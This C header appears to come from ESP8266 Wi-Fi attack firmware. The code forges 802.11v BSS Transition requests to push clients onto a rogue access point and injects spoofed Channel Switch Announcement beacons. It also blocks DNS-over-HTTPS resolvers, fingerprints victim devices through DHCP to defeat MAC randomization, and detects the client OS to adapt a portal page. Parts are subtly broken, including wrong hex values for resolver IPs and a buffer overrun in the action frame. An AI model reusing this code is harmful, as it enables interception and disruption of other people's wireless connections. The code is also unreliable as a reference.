OP-AMINUL-FF/OPX_my_demon/NETHERCAP_ESP8266/attacks.h
// --- DoH (DNS over HTTPS) Mitigation ---
static const uint32_t dohBlockIPs[] = {
  0x01010101, // 1.1.1.1 Cloudflare
  0x01010001, // 1.0.0.1 Cloudflare
  0x08080808, // 8.8.8.8 Google
  0x08080404, // 8.8.4.4 Google
  0x90909090, // 9.9.9.9 Quad9
  0x90909091, // 9.9.9.10 Quad9
  0x26262626, // 149.112.112.112 Quad9
  0x14141414, // 20.20.20.20
};
static const int dohBlockIPCount = sizeof(dohBlockIPs) / sizeof(dohBlockIPs[0]);
static const char* dohCanaryDomains[] = {
  "use-application-dns.net",
  "captive.apple.com",
  "connectivitycheck.gstatic.com",
  "connectivitycheck.android.com",
  "clients3.google.com"
};
static const int dohCanaryCount = sizeof(dohCanaryDomains) / sizeof(dohCanaryDomains[0]);

static bool isDOHProviderIP(uint32_t ip) {
  for (int i = 0; i < dohBlockIPCount; i++) {
    if (ip == dohBlockIPs[i]) return true;
  }
  return false;
}

static bool isDOHCanaryDomain(const String& domain) {
  String lower = domain;
  lower.toLowerCase();
  for (int i = 0; i < dohCanaryCount; i++) {
    if (lower.indexOf(dohCanaryDomains[i]) >= 0) return true;
  }
  return false;
}

// --- 802.11v BSS Transition Management ---
static void sendBSSTransitionRequest(uint8_t ch, uint8_t* targetBSSID, uint8_t* clientMAC, uint8_t* rogueBSSID) {
  uint8_t pkt[64] = {0};
  pkt[0] = 0x00; pkt[1] = 0x00; // Category: Radio Measurement
  pkt[2] = 0x07;                 // Action: BSS Transition Management Request
  pkt[3] = 0x00;                 // Dialog Token
  pkt[4] = 0x01;                 // Request Mode: Preferred Candidate List Included
  pkt[5] = 0x00; pkt[6] = 0x00; // Disassociation Timer
  pkt[7] = 0x00;                 // Validity Interval
  // BSS Transition Candidate List Entry
  pkt[8] = 0x01;                 // Candidate ID
  memcpy(&pkt[9], rogueBSSID, 6); // BSSID of rogue AP
  pkt[15] = 0x00;                // Candidate Status: Accept
  pkt[16] = 0x00;                // Preference (0 = no preference)

  uint8_t actionFrame[40] = {0};
  actionFrame[0] = 0xD0; actionFrame[1] = 0x00; // Action frame (Category)
  memcpy(&actionFrame[4], targetBSSID, 6);        // DA = target BSSID
  memcpy(&actionFrame[10], clientMAC, 6);          // SA = client MAC
  memcpy(&actionFrame[16], targetBSSID, 6);        // BSSID
  memcpy(&actionFrame[24], pkt, 17);               // Action body

  wifi_set_channel(ch);
  for (int i = 0; i < 5; i++) {
    wifi_send_pkt_freedom(actionFrame, 41, 0);
    yield();
  }
  addLog("802.11v BSS Transition Request sent", LOG_WARN);
}

// --- Channel Switch Announcement (CSA) Beacon ---
static void sendCSA(uint8_t ch, uint8_t* bssid, String ssid, uint8_t newCh) {
  uint8_t ssidLen = ssid.length();
  if (ssidLen > SSID_MAX_LEN) ssidLen = SSID_MAX_LEN;
  uint8_t beacon[128] = {0};
  beacon[0] = 0x80; beacon[1] = 0x00;
  beacon[2] = 0x00; beacon[3] = 0x00;
  memcpy(&beacon[4], bssid, 6);
  memcpy(&beacon[10], bssid, 6);
  memcpy(&beacon[16], bssid, 6);
  beacon[22] = 0x00; beacon[23] = 0x00;
  beacon[24] = 0x01; beacon[25] = 0x08;
  beacon[26] = 0x02; beacon[27] = 0x04;
  beacon[28] = 0x0B; beacon[29] = 0x16;
  beacon[30] = 0x0C; beacon[31] = 0x12;
  beacon[32] = 0x24; beacon[33] = 0x30;
  beacon[34] = 0x48; beacon[35] = 0x60;
  beacon[36] = 0x6C;
  beacon[37] = 0x00; beacon[38] = ssidLen;
  for (int i = 0; i < ssidLen; i++) beacon[39 + i] = ssid.charAt(i);
  int pktLen = 39 + ssidLen;
  // CSA Element (ID 37, len 3: Mode=1, New Channel, Count=0)
  beacon[pktLen] = 37;
  beacon[pktLen + 1] = 3;
  beacon[pktLen + 2] = 1;     // Mode: Switch immediately
  beacon[pktLen + 3] = newCh; // New Channel Number
  beacon[pktLen + 4] = 0;     // Count: 0 = immediate
  pktLen += 5;

  wifi_set_channel(ch);
  for (int i = 0; i < BEACON_BURST_COUNT; i++) {
    wifi_send_pkt_freedom(beacon, pktLen, 0);
    if (i % 5 == 0) yield();
  }
  beaconPkts += BEACON_BURST_COUNT;
  totalPkts += BEACON_BURST_COUNT;
  addLog("CSA beacon injected: ch" + String(ch) + " -> " + String(newCh), LOG_WARN);
}

// --- PMF Detection & WPA3 Countermeasures ---
static bool hasPMF(const Network& net) {
  return net.wpa3 || net.pmf;
}

static bool shouldUseAlternativeAttack(const Network& net) {
  if (net.wpa3 || net.pmf) {
    return true;
  }
  return false;
}

// --- DHCP Fingerprinting (802.11 MAC Randomization Bypass) ---

struct DeviceFingerprint {
  uint8_t clientMAC[6];
  uint8_t dhcpOpt55[DHCP_OPTION_55_MAX];
  uint8_t opt55Len;
  String vendorClass;     // Option 60
  String osClass;
  unsigned long lastSeen;
  int confidence;          // 0-100
};

static DeviceFingerprint fingerprints[DHCP_FINGERPRINT_MAX];
static int fingerprintCount = 0;

static const char* classifyOS_DHCP(const uint8_t* opt55, uint8_t len, const String& vendorClass) {
  if (vendorClass.indexOf("android") >= 0 || vendorClass.indexOf("Android") >= 0) return "Android";
  if (vendorClass.indexOf("MSFT") >= 0) return "Windows";
  if (vendorClass.indexOf("iPad") >= 0 || vendorClass.indexOf("iPhone") >= 0) return "iOS";
  if (vendorClass.indexOf("Linux") >= 0) return "Linux";
  if (len >= 4 && opt55[0] == 1 && opt55[1] == 28 && opt55[2] == 3 && opt55[3] == 15) return "Windows";
  if (len >= 3 && opt55[0] == 1 && opt55[1] == 121 && opt55[2] == 3) return "Android";
  if (len >= 4 && opt55[0] == 1 && opt55[1] == 6 && opt55[2] == 12 && opt55[3] == 15) return "iOS";
  return "Unknown";
}

static int findFingerprint(const uint8_t* opt55, uint8_t len, const String& vendorClass) {
  for (int i = 0; i < fingerprintCount; i++) {
    if (fingerprints[i].opt55Len == len &&
        memcmp(fingerprints[i].dhcpOpt55, opt55, len) == 0 &&
        fingerprints[i].vendorClass == vendorClass) {
      return i;
    }
  }
  return -1;
}

static int findFingerprintByMAC(const uint8_t* mac) {
  for (int i = 0; i < fingerprintCount; i++) {
    if (memcmp(fingerprints[i].clientMAC, mac, 6) == 0) return i;
  }
  return -1;
}

static void updateFingerprint(const uint8_t* mac, const uint8_t* opt55, uint8_t opt55Len, const String& vendorClass) {
  int idx = findFingerprint(opt55, opt55Len, vendorClass);
  if (idx >= 0) {
    fingerprints[idx].lastSeen = millis();
    fingerprints[idx].confidence = min(100, fingerprints[idx].confidence + 10);
    memcpy(fingerprints[idx].clientMAC, mac, 6);
    return;
  }
  idx = findFingerprintByMAC(mac);
  if (idx >= 0) {
    memcpy(fingerprints[idx].dhcpOpt55, opt55, min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX));
    fingerprints[idx].opt55Len = min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX);
    fingerprints[idx].vendorClass = vendorClass;
    fingerprints[idx].osClass = classifyOS_DHCP(opt55, opt55Len, vendorClass);
    fingerprints[idx].lastSeen = millis();
    fingerprints[idx].confidence = min(100, fingerprints[idx].confidence + 20);
    return;
  }
  if (fingerprintCount < DHCP_FINGERPRINT_MAX) {
    memcpy(fingerprints[fingerprintCount].clientMAC, mac, 6);
    memcpy(fingerprints[fingerprintCount].dhcpOpt55, opt55, min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX));
    fingerprints[fingerprintCount].opt55Len = min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX);
    fingerprints[fingerprintCount].vendorClass = vendorClass;
    fingerprints[fingerprintCount].osClass = classifyOS_DHCP(opt55, opt55Len, vendorClass);
    fingerprints[fingerprintCount].lastSeen = millis();
    fingerprints[fingerprintCount].confidence = 50;
    fingerprintCount++;
  }
}

// DHCP Option parsing in promiscuous callback stub
static void parseDHCP(uint8_t* buf, uint16_t len, uint8_t* clientMAC) {
  if (len < 240) return;
  int dhcpStart = -1;
  for (int i = 0; i < (int)len - 8; i++) {
    if (buf[i] == 0x08 && buf[i+1] == 0x00 && buf[i+2] == 0x00 && buf[i+3] == 0x00 &&
        buf[i+4] == 0x00 && buf[i+5] == 0x00 && buf[i+6] == 0x00 && buf[i+7] == 0x00) {
      dhcpStart = i + 8;
      break;
    }
  }
  if (dhcpStart < 0 || dhcpStart >= (int)len - 60) return;
  uint8_t opt55[DHCP_OPTION_55_MAX];
  uint8_t opt55Len = 0;
  String vendorClass = "";
  int pos = dhcpStart + 4 + 12 + 16 + 16 + 64 + 4 + 4 + 4; // skip fixed DHCP fields
  while (pos < (int)len - 2 && buf[pos] != 255) {
    if (buf[pos] == 0) { pos++; continue; }
    uint8_t optLen = buf[pos + 1];
    if (pos + 2 + optLen > (int)len) break;
    if (buf[pos] == 55 && opt55Len == 0) {
      opt55Len = min(optLen, (uint8_t)DHCP_OPTION_55_MAX);
      memcpy(opt55, &buf[pos + 2], opt55Len);
    }
    if (buf[pos] == 60) {
      for (int c = 0; c < optLen; c++) vendorClass += (char)buf[pos + 2 + c];
    }
    pos += 2 + optLen;
  }
  if (opt55Len > 0) {
    updateFingerprint(clientMAC, opt55, opt55Len, vendorClass);
  }
}

// --- Automated UI Adaptation (User-Agent Based) ---
enum ClientOS {
  OS_UNKNOWN,
  OS_IOS,
  OS_ANDROID,
  OS_WINDOWS,
  OS_MAC,
  OS_LINUX
};

static ClientOS detectOS(const String& userAgent) {
  String ua = userAgent;
  ua.toLowerCase();
  if (ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0 || ua.indexOf("ipod") >= 0) return OS_IOS;
  if (ua.indexOf("android") >= 0) return OS_ANDROID;
  if (ua.indexOf("windows") >= 0) return OS_WINDOWS;
  if (ua.indexOf("macintosh") >= 0 || ua.indexOf("mac os") >= 0) return OS_MAC;
  if (ua.indexOf("linux") >= 0) return OS_LINUX;
  return OS_UNKNOWN;
}

